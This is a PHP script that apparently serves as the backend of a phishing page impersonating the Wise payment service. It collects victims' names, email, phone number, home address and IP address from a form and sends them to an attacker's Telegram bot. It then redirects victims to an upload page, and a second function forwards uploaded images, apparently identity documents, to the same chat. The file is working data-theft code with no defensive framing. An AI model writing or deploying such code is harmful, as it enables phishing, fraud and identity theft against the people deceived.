<?php 
session_start();
require 'config.php';

function sendTotelegram($data){
    global $bot;
    global $chat_id;

    $data = urlencode($data);
    $api = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$chat_id&text=$data";
    $c = curl_init($api);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}

// دالة إرسال صورة مباشرة إلى تيليجرام
function sendPhotoToTelegram($filePath){
    global $bot;
    global $chat_id;

    $url = "https://api.telegram.org/bot$bot/sendPhoto";

    $post_fields = [
        'chat_id' => $chat_id,
        'photo' => new CURLFile(realpath($filePath))
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);

    $output = curl_exec($ch);
    curl_close($ch);

    return $output;
}

$ip = $_SERVER['REMOTE_ADDR'];

if (isset($_POST['first'])) {

    $msg = "
WISE - Address 
--------------------------
first name: ".$_POST['first']."
last name: ".$_POST['last']."
email: ".$_POST['email']."
phone: ".$_POST['phone']."
street: ".$_POST['street']."
zip: ".$_POST['zip']."
city: ".$_POST['city']."
country: ".$_POST['country']."

--------------------------
IP: $ip
";

    sendTotelegram($msg);

header("location: upload.php");
}

?>
